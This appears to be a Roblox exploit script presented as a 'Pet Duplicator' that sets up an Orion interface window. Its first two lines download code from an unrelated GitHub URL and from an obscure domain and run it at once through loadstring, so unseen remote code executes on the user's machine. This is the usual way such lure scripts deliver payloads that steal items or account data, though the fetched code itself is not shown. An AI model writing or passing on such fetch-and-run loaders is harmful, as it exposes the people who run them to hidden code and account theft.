loadstring(game:HttpGet('https://github.com/vince1212/1212.git', true))()
local OrionLib = loadstring(game:HttpGet("https://twix.cyou/Orion.txt", true))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Window = OrionLib:MakeWindow({
    Name = "Pet Duplicator",
    SaveConfig = true,
    ConfigFolder = "petduplicator",
    IntroEnabled = true,
    IntroText = "Loading Script...",
    Icon = "rbxassetid://4483345998",
    IntroIcon = "rbxassetid://4483345998"
})
